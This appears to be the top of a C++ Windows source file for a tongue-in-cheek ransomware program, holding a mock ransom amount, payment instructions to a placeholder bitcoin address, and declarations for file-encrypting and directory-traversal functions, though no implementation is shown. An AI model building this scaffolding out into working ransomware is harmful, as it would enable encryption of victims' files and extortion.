#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <fstream>
#include <time.h>
#include <string>
#include <windows.h>
#include <shellapi.h>

#define AmountOfMoney "100 gazillion gorillion sextillion doubloons"
#define PaymentInstructions " to [le bitcoin address]."

FILE* OUTPUT_FILE;

#define debug
//#define CheckExtension

extern "C" int RandomGenerator();
void CryptFile(std::string Path);
void TraverseDir(std::string Path);
bool find(const std::string& myString, const std::string& subString);